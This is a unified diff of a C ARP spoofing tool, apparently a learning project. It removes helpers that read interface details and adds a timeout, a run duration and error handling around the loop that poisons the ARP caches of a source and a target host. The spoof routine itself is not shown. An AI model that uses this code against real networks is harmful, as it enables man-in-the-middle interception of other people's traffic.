@@ -3,81 +3,6 @@
 #include <net/if.h>
 #include <linux/if_arp.h>
 
-static int interface_index(char *name)
-{
-	int sockfd;
-	struct ifreq if_idx;
-
-	/* Open RAW socket to send on */
-	if ((sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)) == -1) {
-		perror("socket");
-		return -1;
-	}
-
-	ft_bzero(&if_idx, sizeof(struct ifreq));
-	ft_strncpy(if_idx.ifr_name, name, IFNAMSIZ - 1);
-	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
-		perror("SIOCGIFINDEX");
-		close(sockfd);
-		return -1;
-	}
-
-	close(sockfd);
-	return if_idx.ifr_ifindex;
-}
-
-static int interface_mac(char *name, uint8_t *ret)
-{
-	int sockfd;
-	struct ifreq if_mac;
-	struct sockaddr sockaddr;
-
-	/* Open RAW socket to send on */
-	if ((sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)) == -1) {
-		perror("socket");
-		return -1;
-	}
-
-	ft_bzero(&if_mac, sizeof(struct ifreq));
-	ft_strncpy(if_mac.ifr_name, name, IFNAMSIZ - 1);
-	if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0) {
-		perror("SIOCGIFHWADDR");
-		close(sockfd);
-		return -1;
-	}
-	sockaddr = *(struct sockaddr *)&if_mac.ifr_hwaddr;
-	ft_memcpy(ret, sockaddr.sa_data, ETH_ADDR_LEN);
-
-	close(sockfd);
-	return 0;
-}
-
-static int interface_ip(char *name, uint8_t *ret)
-{
-	int sockfd;
-	struct ifreq if_ip;
-	struct sockaddr_in sockaddr;
-
-	/* Open RAW socket to send on */
-	if ((sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)) == -1) {
-		perror("socket");
-		return -1;
-	}
-
-	ft_bzero(&if_ip, sizeof(struct ifreq));
-	ft_strncpy(if_ip.ifr_name, name, IFNAMSIZ - 1);
-	if (ioctl(sockfd, SIOCGIFADDR, &if_ip) < 0) {
-		perror("SIOCGIFADDR");
-		close(sockfd);
-		return -1;
-	}
-	sockaddr = *(struct sockaddr_in *)&if_ip.ifr_addr;
-	ft_memcpy(ret, (uint8_t*)&sockaddr.sin_addr, IP_ADDR_LEN);
-
-	close(sockfd);
-	return 0;
-}
-
 static int handle_response(uint8_t *ip, char *buffer, uint8_t *received_mac)
 {
 	struct arp_hdr *arp;
@@ -89,7 +14,6 @@ static int handle_response(uint8_t *ip, char *buffer, uint8_t *received_mac)
 	arp = (struct arp_hdr *)(buffer + sizeof(struct ethernet_hdr));
 
 	type = ft_ntohs(ethernet->type);
-	/* TODO: Check if an OPCODE check is needed */
 	opcode = ft_ntohs(arp->op);
 
 	if (type == ETH_P_ARP && opcode == ARP_REPLY &&
@@ -195,6 +119,7 @@ static int arp_request(uint8_t *tip, struct sockaddr_ll sockaddr,
 	dprintf(STDOUT_FILENO, "Waiting ARP response for ip ");
 	print_ip(STDOUT_FILENO, tip);
 	dprintf(STDOUT_FILENO, ", press CTRL+C to exit...\n");
+	alarm(ARP_TIMEOUT); /* Set timeout to 3 by default, response should be fast */
 	while (g_data.loop) {
 		ret = recvfrom(g_data.sockfd, buffer, len, MSG_DONTWAIT,
 			(struct sockaddr *)&sockaddr, &addr_len);
@@ -208,12 +133,15 @@ static int arp_request(uint8_t *tip, struct sockaddr_ll sockaddr,
 		}
 	}
 
+	dprintf(STDERR_FILENO, "[!] Couldn't manage to get MAC address for ip ");
+	print_ip(STDERR_FILENO, tip);
+	dprintf(STDERR_FILENO, "\n");
+
 	return 1;
 }
 
 int ft_proxy(uint8_t *source_ip, uint8_t *target_ip)
 {
-	// char buffer[len];
 	struct sockaddr_ll sockaddr;
 	int if_idx;
 	uint8_t if_mac[ETH_ADDR_LEN] = {0};
@@ -254,23 +182,32 @@ int ft_proxy(uint8_t *source_ip, uint8_t *target_ip)
 	print_ip(STDOUT_FILENO, g_data.source_ip);
 	dprintf(STDOUT_FILENO, " and ");
 	print_ip(STDOUT_FILENO, g_data.target_ip);
+	if (g_data.duration) {
+		dprintf(STDOUT_FILENO, " for %d seconds", g_data.duration);
+		alarm(g_data.duration);
+	}
 	dprintf(STDOUT_FILENO, "\n");
 
 	uint8_t wait_loop_len = 4;
 	char *wait_loop = "/|\\|";
-	int i = 0;
+	uint64_t i = 0;
 
 	while (g_data.loop) {
-		/* TODO: Spoof error check */
-		spoof(target_ip, g_data.target_mac, source_ip, if_mac,
-			sockaddr);
-		spoof(source_ip, g_data.source_mac, target_ip, if_mac,
-			sockaddr);
+		if ((spoof(target_ip, g_data.target_mac, source_ip, if_mac,
+			sockaddr)) != 0 ||
+			(spoof(source_ip, g_data.source_mac, target_ip, if_mac,
+			sockaddr) != 0))
+		{
+			break;
+		}
+
+		/* Display related */
 		ft_putchar('\r');
 		printf("Spoofing ");
 		fflush(stdout);
 		ft_putchar(wait_loop[i % wait_loop_len]);
 		i++;
+
 		clock_nanosleep(CLOCK_REALTIME, 0, &wait, NULL);
 	}
 
